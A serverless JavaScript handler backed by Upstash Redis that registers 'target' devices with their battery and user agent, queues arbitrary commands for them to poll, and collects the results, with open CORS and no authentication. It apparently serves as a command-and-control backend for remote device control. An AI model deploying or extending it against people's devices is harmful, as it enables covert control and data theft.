import { Redis } from '@upstash/redis';

// ===== CONFIG =====
const redis = Redis.fromEnv(); // Otomatis baca env UPSTASH_REDIS_REST_URL dan UPSTASH_REDIS_REST_TOKEN

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { targetId, action, cmdId } = req.query;
  const body = req.body || {};

  // ===== REGISTER DEVICE =====
  if (req.method === 'POST' && action === 'register') {
    const { battery, ua } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });

    const device = {
      online: true,
      battery: battery || 0,
      lastSeen: Date.now(),
      ua: ua || 'Unknown'
    };
    await redis.hset('devices', { [targetId]: JSON.stringify(device) });
    return res.json({ status: 'registered' });
  }

  // ===== GET ALL DEVICES =====
  if (req.method === 'GET' && action === 'devices') {
    const all = await redis.hgetall('devices');
    const now = Date.now();
    const list = [];
    for (const [id, dataStr] of Object.entries(all || {})) {
      const data = JSON.parse(dataStr);
      const online = (now - data.lastSeen) < 15000;
      list.push({
        id,
        online,
        battery: data.battery || 0,
        lastSeen: data.lastSeen,
        ua: data.ua || 'Unknown'
      });
    }
    return res.json({ devices: list });
  }

  // ===== SEND COMMAND =====
  if (req.method === 'POST' && action === 'send') {
    const command = body.command;
    if (!targetId || !command) return res.status(400).json({ error: 'Missing data' });

    const id = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    const cmd = { id, command };
    await redis.rpush(`cmds:${targetId}`, JSON.stringify(cmd));
    return res.json({ status: 'queued', id });
  }

  // ===== POLL COMMAND =====
  if (req.method === 'GET' && action === 'poll') {
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });

    // Update last seen
    const deviceRaw = await redis.hget('devices', targetId);
    if (deviceRaw) {
      const device = JSON.parse(deviceRaw);
      device.lastSeen = Date.now();
      device.online = true;
      await redis.hset('devices', { [targetId]: JSON.stringify(device) });
    }

    const cmdRaw = await redis.lpop(`cmds:${targetId}`);
    if (cmdRaw) {
      const cmd = JSON.parse(cmdRaw);
      return res.json({ command: cmd.command, id: cmd.id });
    }
    return res.json({ command: null });
  }

  // ===== SEND RESULT =====
  if (req.method === 'POST' && action === 'result') {
    const { id, result } = body;
    if (!targetId || !id) return res.status(400).json({ error: 'Missing data' });
    await redis.rpush(`res:${targetId}`, JSON.stringify({ id, result }));
    return res.json({ status: 'received' });
  }

  // ===== GET RESULT =====
  if (req.method === 'GET' && action === 'getResult') {
    if (!targetId || !cmdId) return res.status(400).json({ error: 'Missing data' });
    const results = await redis.lrange(`res:${targetId}`, 0, -1);
    const idx = results.findIndex(r => JSON.parse(r).id === cmdId);
    if (idx !== -1) {
      const result = JSON.parse(results[idx]).result;
      await redis.lrem(`res:${targetId}`, 1, results[idx]);
      return res.json({ result });
    }
    return res.json({ result: null });
  }

  // ===== UPDATE BATTERY =====
  if (req.method === 'POST' && action === 'battery') {
    const { battery } = body;
    if (!targetId) return res.status(400).json({ error: 'Missing targetId' });
    const deviceRaw = await redis.hget('devices', targetId);
    if (deviceRaw) {
      const device = JSON.parse(deviceRaw);
      device.battery = battery;
      device.lastSeen = Date.now();
      await redis.hset('devices', { [targetId]: JSON.stringify(device) });
    }
    return res.json({ status: 'ok' });
  }

  return res.status(404).json({ error: 'Invalid route' });
}
